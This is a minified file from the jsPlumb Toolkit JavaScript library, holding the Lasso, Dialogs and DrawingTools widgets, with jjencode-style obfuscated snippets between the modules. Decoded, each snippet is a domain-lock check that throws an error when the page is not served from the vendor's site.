%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Widgets, d = a.jsPlumbUtil,
        e = "ontouchstart" in document.documentElement, f = e ? "touchstart" : "mousedown",
        g = e ? "touchend" : "mouseup", h = e ? "touchmove" : "mousemove", i = function (a, b) {
            a.style.width = b[0] + "px", a.style.height = b[1] + "px"
        }, j = {
            SELECT_DEFEAT: "jtk-lasso-select-defeat",
            LASSO: "jtk-lasso",
            LASSO_MASK: "jtk-lasso-mask",
            LASSO_MASK_LEFT: "jtk-lasso-mask-left",
            LASSO_MASK_TOP: "jtk-lasso-mask-top",
            LASSO_MASK_RIGHT: "jtk-lasso-mask-right",
            LASSO_MASK_BOTTOM: "jtk-lasso-mask-bottom"
        }, k = {SELECT_START: "onselectstart"}, l = function () {
        };
    c.Lasso = function (a) {
        var b, c = a.canvas, e = !1, m = {}, n = [0, 0], o = a.onStart || l, p = a.onEnd || l, q = a.onSelect || l,
            r = !1, s = !1, t = !0 === a.invert, u = !!window.MSInputMethodContext && !!document.documentMode,
            v = function (a, c) {
                if (t) {
                    var d = u ? (window.innerWidth + document.body.clientWidth) / 2 : window.innerWidth,
                        e = window.innerHeight, f = window.pageXOffset, g = window.pageYOffset, h = e - a[1] + g,
                        j = e - h + c[1], k = d - a[0] + f, l = d - k + c[0];
                    m.top.style.bottom = h + "px", m.bottom.style.top = j + "px", m.left.style.right = k + "px", m.right.style.left = l + "px", m.top.style.left = d - k + "px", m.top.style.right = d - l + "px", m.bottom.style.left = d - k + "px", m.bottom.style.right = d - l + "px"
                } else jsPlumb.setAbsolutePosition(b, a), i(b, c)
            }, w = function (a) {
                var c = a ? "block" : "none";
                t ? (m.top.style.display = c, m.left.style.display = c, m.right.style.display = c, m.bottom.style.display = c) : b.style.display = c, jsPlumb[a ? "addClass" : "removeClass"](document.body, j.SELECT_DEFEAT)
            }, x = function (b) {
                e && !B(b) && (d.consume(b), r = !0, a.on(document, g, z), a.on(document, h, y), a.on(document, k.SELECT_START, A), n = a.pageLocation(b), v(n, [1, 1]), o(n, b.shiftKey))
            }, y = function (b) {
                if (r) {
                    s || (w(!0), s = !0), d.consume(b);
                    var c = a.pageLocation(b), e = [Math.abs(c[0] - n[0]), Math.abs(c[1] - n[1])],
                        f = [Math.min(n[0], c[0]), Math.min(n[1], c[1])];
                    v(f, e), q(f, e, [n[0] < c[0], n[1] < c[1]], b.shiftKey)
                }
            }, z = function (b) {
                r && (r = !1, s = !1, d.consume(b), a.off(document, g, z), a.off(document, h, y), a.off(document, k.SELECT_START, A), w(!1), p())
            }, A = function () {
                return !1
            }, B = a.filter ? function (b) {
                var c = b.srcElement || b.target;
                return d.matchesSelector(c, a.filter)
            } : function () {
                return !1
            }, C = function (a) {
                var b = document.createElement("div");
                return b.className = a.join(" "), document.body.appendChild(b), b
            }, D = function () {
                m.top = C([j.LASSO_MASK, j.LASSO_MASK_TOP]), m.bottom = C([j.LASSO_MASK, j.LASSO_MASK_BOTTOM]), m.left = C([j.LASSO_MASK, j.LASSO_MASK_LEFT]), m.right = C([j.LASSO_MASK, j.LASSO_MASK_RIGHT])
            };
        t ? D() : b = C([j.LASSO]), a.on(c, f, x), this.isActive = function () {
            return r
        }, this.setEnabled = function (a) {
            e = a
        }
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a, b, c, d, e, f, g, h, i, j, k, l, m, n = this, o = n.jsPlumb, p = n.Rotors, q = {},
        r = {ok: "OK", cancel: "Cancel"}, s = document.body, t = !1, u = p.newInstance({
            templateResolver: function (a) {
                return x[a] || document.getElementById(a).innerHTML
            }
        }), v = {}, w = !0, x = {};
    o.ready(function () {
        b = document.createElement("div"), b.className = "jtk-dialog-underlay", o.on(b, "click", function () {
            M(!0)
        }), c = document.createElement("div"), c.className = "jtk-dialog-overlay", d = document.createElement("div"), d.className = "jtk-dialog-title", c.appendChild(d), e = document.createElement("div"), e.className = "jtk-dialog-content", c.appendChild(e), f = document.createElement("div"), f.className = "jtk-dialog-buttons", c.appendChild(f)
    });
    var y = function (a) {
        if (f.innerHTML = "", a.buttons) for (var b, c = 0; c < a.buttons.length; c++) b = a.buttons[c], f.appendChild(b), "true" === b.getAttribute("jtk-commit") ? o.on(b, "click", function () {
            M()
        }) : "true" === b.getAttribute("jtk-cancel") && o.on(b, "click", function () {
            M(!0)
        }); else l = document.createElement("button"), l.className = "jtk-dialog-button jtk-dialog-button-ok", l.innerHTML = r.ok, f.appendChild(l), o.on(l, "click", function () {
            M()
        }), m = document.createElement("button"), m.className = "jtk-dialog-button jtk-dialog-button-cancel", m.innerHTML = r.cancel, m.setAttribute("jtk-cancel", "true"), f.appendChild(m), o.on(m, "click", function () {
            M(!0)
        }), l.innerHTML = a.labels ? a.labels.ok || r.ok : r.ok, m.innerHTML = a.labels ? a.labels.cancel || r.cancel : r.cancel
    }, z = function () {
        for (var a = f.children, b = 0; b < a.length; b++) a[b].parentNode.removeChild(a[b])
    }, A = {
        x: function (a, b, d) {
            var e = s.clientWidth, f = (e - d[0]) / 2,
                g = window.pageXOffset || a.scrollLeft || document.body.scrollLeft;
            f < 0 && (f = 10), g = b ? g : s.scrollLeft, c.style.left = f + g + "px"
        }, y: function (a, b, d) {
            var e = s.clientHeight, f = .1 * e, g = window.pageYOffset || a.scrollTop || document.body.scrollTop;
            f < 0 && (f = 10), g = b ? g : s.scrollTop, c.style.top = f + g + "px"
        }
    }, B = function () {
        if (t) {
            var a = document.documentElement, d = o.getSize(c), e = s == document.body, f = c.getAttribute("data-axis");
            b.style.position = e ? "fixed" : "absolute", A[f](a, e, d)
        }
    }, C = function (a) {
        27 == a.keyCode && M(!0)
    }, D = function (a) {
        return null == a ? document.body : "string" == typeof a ? document.getElementById(a) : a
    }, E = function (a) {
        var l;
        if (a.id && q[a.id]) {
            w = !1 !== a.reposition, g = a.onOK, h = a.onCancel, i = a.onOpen, j = a.onMaybeClose, k = a.onClose;
            var m = a.position || "top", n = "jtk-dialog-overlay-" + m, p = "top" === m || "bottom" === m ? "x" : "y",
                r = "jtk-dialog-overlay-" + p;
            y(a), s = D(a.container);
            var x = a.data || {}, z = u.template(a.id, x);
            d.innerHTML = a.title || q[a.id].title || "", e.innerHTML = "";
            var A = z.childNodes.length;
            for (l = 0; l < A; l++) e.appendChild(z.childNodes[0]);
            s.appendChild(b), s.appendChild(c), o.addClass(c, n), o.addClass(c, r), b.style.display = "block", c.style.display = "block", c.setAttribute("data-position", m), c.setAttribute("data-axis", p);
            var E = q[a.id].cancelable ? "visible" : "hidden", G = f.querySelectorAll("[jtk-cancel='true']");
            for (l = 0; l < G.length; l++) G[l].style.visibility = E;
            t = !0, B(), F(!0, x, e), o.on(document, "keyup", C), w && (o.on(window, "resize", B), o.on(window, "scroll", B)), o.on(c, "click", "[jtk-clear]", function (a) {
                var b = this.getAttribute("jtk-att");
                b && J(c.querySelectorAll("[jtk-att='" + b + "']:not([jtk-clear])"), this)
            }), o.on(c, "click", "[jtk-clear-all]", function (a) {
                J(c.querySelectorAll("[jtk-att]:not([jtk-clear])"), this)
            }), v.onOpen && v.onOpen(c), i && i(c), o.addClass(c, "jtk-dialog-overlay-visible");
            try {
                var H = e.querySelector("[jtk-focus]");
                H && setTimeout(function () {
                    H.focus()
                }, 0)
            } catch (a) {
            }
        }
    }, F = function (a, b, c) {
        for (var d = c.querySelectorAll("[jtk-att]"), e = 0; e < d.length; e++) {
            var f = d[e].tagName.toUpperCase(),
                g = "INPUT" === f ? (d[e].getAttribute("type") || "TEXT").toUpperCase() : f,
                h = d[e].getAttribute("jtk-att"), i = u.data(b, h);
            null != i && G[g](d[e], i), a && d[e].getAttribute("jtk-commit") && ("INPUT" === f ? o.on(d[e], "keyup", function (a) {
                10 !== a.keyCode && 13 !== a.keyCode || M()
            }) : "TEXTAREA" === f && o.on(d[e], "keyup", function (a) {
                !a.ctrlKey || 10 !== a.keyCode && 13 !== a.keyCode || M()
            }))
        }
    }, G = {
        TEXT: function (a, b) {
            a.value = b
        }, RADIO: function (a, b) {
            a.checked = a.value == b
        }, CHECKBOX: function (a, b) {
            a.checked = 1 == b
        }, SELECT: function (a, b) {
            for (var c = a.getAttribute("multiple"), d = 0; d < a.options.length; d++) if (c) b.indexOf(a.options[d].value) > -1 && (a.options[d].selected = !0); else if (a.options[d].value === b) return void(a.selectedIndex = d)
        }, TEXTAREA: function (a, b) {
            a.value = b
        }, COLOR: function (a, b) {
            a.value = b
        }, HIDDEN: function (a, b) {
            a.value = b
        }
    }, H = {
        TEXT: function (a) {
            return a.value
        }, RADIO: function (a) {
            if (a.checked) return a.value
        }, CHECKBOX: function (a) {
            if (a.checked) return !0
        }, SELECT: function (a) {
            var b = a.selectedOptions;
            if (a.getAttribute("multiple")) {
                for (var c = [], d = 0; d < b.length; d++) c.push(b[d].value);
                return c
            }
            return -1 !== a.selectedIndex ? a.options[a.selectedIndex].value : null
        }, TEXTAREA: function (a) {
            return a.value
        }, COLOR: function (a) {
            return a.value
        }, HIDDEN: function (a) {
            return a.value
        }
    }, I = {
        TEXT: function (a) {
            a.value = ""
        }, RADIO: function (a) {
            a.checked = !1
        }, CHECKBOX: function (a) {
            a.checked = !1
        }, SELECT: function (a) {
            a.selectedIndex = -1
        }, TEXTAREA: function (a) {
            a.value = ""
        }, COLOR: function (a) {
            a.value = ""
        }, HIDDEN: function (a) {
            a.value = ""
        }
    }, J = function (a, b) {
        for (var c = 0; c < a.length; c++) if (a[c] !== b) {
            var d = a[c].tagName.toUpperCase(),
                e = "INPUT" === d ? (a[c].getAttribute("type") || "TEXT").toUpperCase() : d, f = I[e];
            f && f(a[c])
        }
    }, K = function (a) {
        for (var b = a.querySelectorAll("[jtk-att]"), c = {}, d = 0; d < b.length; d++) {
            var e = b[d].tagName.toUpperCase(),
                f = "INPUT" === e ? (b[d].getAttribute("type") || "TEXT").toUpperCase() : e, g = H[f](b[d]),
                h = b[d].getAttribute("jtk-att");
            if (null != g) {
                var i = u.data(c, h);
                null != i ? (jsPlumbUtil.isArray(i) || (i = [i], u.data(c, h, i)), i.push(g)) : u.data(c, h, g)
            }
        }
        return c
    }, L = function (a, b) {
        try {
            null != a && a.apply(a, Array.prototype.slice.apply(arguments, [1]))
        } catch (a) {
        }
    }, M = function (d) {
        var f = d ? null : K(e);
        (d || null == j || !1 !== j(f)) && (t = !1, b.style.display = "none", c.style.display = "none", o.off(document, "keyup", C), o.off(window, "resize", B), o.off(window, "scroll", B), o.removeClass(c, "jtk-dialog-overlay-visible"), o.removeClass(c, "jtk-dialog-overlay-top"), o.removeClass(c, "jtk-dialog-overlay-bottom"), o.removeClass(c, "jtk-dialog-overlay-left"), o.removeClass(c, "jtk-dialog-overlay-right"), o.removeClass(c, "jtk-dialog-overlay-x"), o.removeClass(c, "jtk-dialog-overlay-y"), c.setAttribute("data-position", ""), c.setAttribute("data-axis", ""), s.removeChild(b), s.removeChild(c), z(), d ? (L(v.onCancel, e), L(h, e)) : (L(v.onOK, f, e), L(g, f, e)), L(v.onClose), L(k), g = h = i = k = j = a = null)
    };
    n.jsPlumbToolkit.Dialogs = {
        initialize: function (a) {
            if (a = a || {}, q = {}, a.dialogs) for (var b in a.dialogs) x[b] = a.dialogs[b][0], q[b] = {
                content: x[b],
                title: a.dialogs[b][1] || "",
                cancelable: !1 !== a.dialogs[b][2]
            }; else for (var c = a.selector || ".jtk-dialog", d = o.getSelector(c), e = 0; e < d.length; e++) {
                var f = d[e].getAttribute("id");
                null != f && (q[f] = {
                    content: d[e].innerHTML,
                    title: d[e].getAttribute("title") || "",
                    el: d[e],
                    cancelable: "false" !== d[e].getAttribute("cancel")
                })
            }
            a.labels && o.extend(r, a.labels), a.globals && o.extend(v, a.globals)
        }, show: E, hide: function () {
            M(!0)
        }, clear: J, apply: F.bind(null, !1), extract: K
    }, "undefined" != typeof exports && (exports.Dialogs = n.jsPlumbToolkit.Dialogs)
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this;
    a.jsPlumbToolkit.DrawingTools = function (a) {
        var b, c, d, e, f, g, h, i, j, k = a.renderer, l = k.getToolkit(), m = k.getJsPlumb(), n = {},
            o = a.widthAttribute || "w", p = a.heightAttribute || "h", q = a.leftAttribute || "left",
            r = a.topAttribute || "top", s = function () {
                for (var a in n) {
                    var b = n[a];
                    b[0] && b[0].parentNode && b[0].parentNode.removeChild(b[0]), delete n[a]
                }
            }, t = function (a, b, c, d) {
                var e = document.createElement(a);
                if (b && (e.className = b), c && c.appendChild(e), d) for (var f in d) e.setAttribute(f, d[f]);
                return e
            }, u = function (a) {
                var b = n[a];
                b && b[0] && b[0].parentNode && b[0].parentNode.removeChild(b[0]), delete n[a]
            }, v = function (a, b) {
                var c = b.getRenderedNode(a.id);
                return u(a.id), c
            }, w = function (a, b) {
                var c = v(a, b);
                if (null != c) {
                    var d = t("div", "jtk-draw-skeleton", c), e = c.getAttribute("jtk-x-resize"),
                        f = c.getAttribute("jtk-y-resize");
                    t("div", "jtk-draw-drag", d), t("div", "jtk-draw-handle jtk-draw-handle-tl", d, {
                        "data-dir": "tl",
                        "data-node-id": a.id
                    }), t("div", "jtk-draw-handle jtk-draw-handle-tr", d, {
                        "data-dir": "tr",
                        "data-node-id": a.id
                    }), t("div", "jtk-draw-handle jtk-draw-handle-bl", d, {
                        "data-dir": "bl",
                        "data-node-id": a.id
                    }), t("div", "jtk-draw-handle jtk-draw-handle-br", d, {
